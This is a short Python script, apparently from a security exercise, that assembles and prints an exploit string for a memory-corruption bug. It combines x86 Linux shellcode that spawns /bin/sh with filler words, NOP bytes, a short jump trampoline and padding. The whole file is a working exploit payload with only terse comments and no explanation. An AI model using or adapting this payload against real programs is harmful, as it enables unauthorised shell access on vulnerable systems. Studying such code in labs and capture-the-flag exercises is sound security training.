import sys

shell_code ="\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"

#print(shell_code)
first_word = "\x58"*4
second_word = "\x59"*4
#print(first_word)
third_word = "\x90"*4 #The four NOPS before the jmp+4
fourth_word = "\x90\x90\xeb\x04" #this is the nop nop jmp+4
fifth_word = "\x5a"*4
padding = "\x90"*31

exploit = first_word+second_word+third_word+fourth_word+fifth_word+shell_code+padding
print(exploit)
sys.stdout.flush()
